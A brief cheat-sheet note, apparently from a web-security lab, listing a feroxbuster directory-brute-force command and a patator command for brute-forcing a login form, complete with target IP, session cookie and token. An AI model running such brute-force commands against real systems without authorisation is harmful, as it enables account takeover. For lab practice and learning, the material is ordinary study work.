# Brute force
`feroxbuster -w <wordlist> -u <url> -e -f -t 100`

`patator http_fuzz method=POST\`  
`> url="http://10.10.152.149/login.php"\`  
`> body="username=admin&password=admin&Login=Login&user_token=ac1667e40de7798edf9f2ff8d67f88b1" \`  
`> header="Cookie: PHPSESSID=nn3c0h646jqajqvf81bd5hd23h; security=impossible"\`  
`> -x quit:fgrep!=loginphp`

![](Brute%20force/image.png)